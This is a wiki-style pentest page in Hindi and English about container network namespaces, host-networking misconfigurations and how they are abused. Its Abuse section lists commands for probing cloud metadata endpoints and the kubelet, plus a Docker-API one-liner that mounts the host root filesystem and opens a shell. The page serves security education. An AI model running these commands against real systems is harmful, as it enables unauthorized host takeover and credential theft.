# नेटवर्क नेमस्पेस

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

नेटवर्क नेमस्पेस इंटरफेस, IP एड्रेसेस, राउटिंग टेबल्स, ARP/neighbor स्टेट, फ़ायरवॉल रूल्स, सॉकेट्स और `/proc/net` जैसे फाइलों की सामग्री जैसे नेटवर्क-संबंधी संसाधनों को अलग करता है। यही कारण है कि एक container के पास ऐसा दिखाई देने वाला अपना `eth0`, अपने लोकल रूट्स और अपना लूपबैक डिवाइस हो सकता है बिना होस्ट के असली network stack का मालिक बने।

सुरक्षा के लिहाज़ से, यह इसलिए महत्वपूर्ण है क्योंकि नेटवर्क पृथक्करण सिर्फ पोर्ट बाइंडिंग से कहीं अधिक है। एक प्राइवेट नेटवर्क नेमस्पेस सीमित करता है कि workload क्या सीधे देख या री-कॉन्फ़िगर कर सकता है। जब वह नेमस्पेस होस्ट के साथ साझा हो जाता है, तो container अचानक होस्ट listeners, होस्ट-लोकल सेवाओं और उन नेटवर्क नियंत्रण बिंदुओं को देखकर या उन तक पहुँच बनाकर लाभ उठा सकता है जिनको कभी application को प्रदर्शित करने का इरादा नहीं था।

## संचालन

नया बनाया गया नेटवर्क नेमस्पेस तब तक खाली या लगभग खाली नेटवर्क वातावरण के साथ शुरू होता है जब तक कि इंटरफेस उससे जोड़े न जाएँ। Container runtimes तब वर्चुअल इंटरफेस बनाते या कनेक्ट करते हैं, एड्रेसेस असाइन करते हैं, और रूट्स कॉन्फ़िगर करते हैं ताकि workload को अपेक्षित कनेक्टिविटी मिल सके। ब्रिज-आधारित डिप्लॉयमेंट्स में, इसका मतलब आमतौर पर यह होता है कि container को एक veth-backed इंटरफेस दिखता है जो होस्ट ब्रिज से जुड़ा होता है। Kubernetes में, CNI प्लगइन्स Pod networking के समकक्ष सेटअप को संभालते हैं।

यह आर्किटेक्चर बताते हुए कि क्यों `--network=host` या `hostNetwork: true` इतना बड़ा बदलाव है। तैयार किए गए प्राइवेट नेटवर्क स्टैक प्राप्त करने के बजाय, workload होस्ट के वास्तविक नेटवर्क स्टैक में शामिल हो जाता है।

## लैब

आप लगभग खाली नेटवर्क नेमस्पेस को निम्न के साथ देख सकते हैं:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
और आप normal और host-networked containers की तुलना कर सकते हैं:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.

## Runtime Usage

Docker और Podman आम तौर पर हर container के लिए एक private network namespace बनाते हैं जब तक कि उसे अलग तरह से configure न किया गया हो। Kubernetes आम तौर पर हर Pod को उसका अपना network namespace देता है, जो उस Pod के अंदर के containers द्वारा share किया जाता है लेकिन host से अलग होता है। Incus/LXC systems भी network-namespace आधारित isolation प्रदान करते हैं, अक्सर virtual networking के विभिन्न सेटअप के साथ।

The common principle is that private networking is the default isolation boundary, while host networking is an explicit opt-out from that boundary.

## Misconfigurations

The most important misconfiguration is simply sharing the host network namespace. This is sometimes done for performance, low-level monitoring, or convenience, but it removes one of the cleanest boundaries available to containers. Host-local listeners become reachable in a more direct way, localhost-only services may become accessible, and capabilities such as `CAP_NET_ADMIN` or `CAP_NET_RAW` become much more dangerous because the operations they enable are now applied to the host's own network environment.

Another problem is overgranting network-related capabilities even when the network namespace is private. A private namespace does help, but it does not make raw sockets or advanced network control harmless.

## Abuse

In weakly isolated setups, attackers may inspect host listening services, reach management endpoints bound only to loopback, sniff or interfere with traffic depending on the exact capabilities and environment, or reconfigure routing and firewall state if `CAP_NET_ADMIN` is present. In a cluster, this can also make lateral movement and control-plane reconnaissance easier.

यदि आप host networking का संदेह करते हैं, तो शुरुआत करें यह पुष्टि करने से कि दिखाई देने वाले interfaces और listeners host के हैं न कि किसी isolated container network के:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only सेवाएँ अक्सर पहली रोचक खोज होती हैं:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
यदि network capabilities मौजूद हैं, तो परीक्षण करें कि क्या workload दिखाई देने वाले stack का निरीक्षण या परिवर्तन कर सकता है:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
क्लस्टर या क्लाउड वातावरणों में, होस्ट नेटवर्किंग metadata और control-plane-adjacent सेवाओं की त्वरित स्थानीय recon को भी जायज़ ठहराती है:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### पूर्ण उदाहरण: Host Networking + Local Runtime / Kubelet Access

Host networking स्वचालित रूप से host root प्रदान नहीं करता है, लेकिन यह अक्सर ऐसी सेवाओं को उजागर करता है जो जानबूझकर केवल node से ही पहुँचने योग्य होती हैं। यदि उन सेवाओं में से कोई कम सुरक्षित है, तो Host networking सीधे privilege-escalation पथ बन जाता है।

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost पर Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
प्रभाव:

- direct host compromise यदि local runtime API बिना उचित सुरक्षा के एक्सपोज़ हो
- cluster reconnaissance या lateral movement यदि kubelet या local agents पहुँच योग्य हों
- traffic manipulation या denial of service जब `CAP_NET_ADMIN` के साथ संयोजित हो

## जांच

इन checks का उद्देश्य यह पता लगाना है कि प्रक्रिया के पास private network stack है या नहीं, कौन से routes और listeners दिखाई देते हैं, और क्या network view पहले से ही host-like दिखता है इससे पहले कि आप capabilities का परीक्षण करें।
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
यहाँ ध्यान देने योग्य बातें:

- यदि namespace identifier या visible interface set host जैसा दिखता है, तो host networking पहले से उपयोग में हो सकता है।
- `ss -lntup` विशेष रूप से उपयोगी है क्योंकि यह loopback-only listeners और local management endpoints को उजागर करता है।
- Routes, interface names, और firewall context तब और अधिक महत्वपूर्ण हो जाते हैं जब `CAP_NET_ADMIN` या `CAP_NET_RAW` मौजूद हों।

जब आप किसी container की समीक्षा कर रहे हों, तो हमेशा network namespace को capability set के साथ साथ आंका जाए। Host networking और मजबूत network capabilities का संयोजन bridge networking और संकुचित default capability set से बिलकुल अलग posture पेश करता है।
{{#include ../../../../../banners/hacktricks-training.md}}
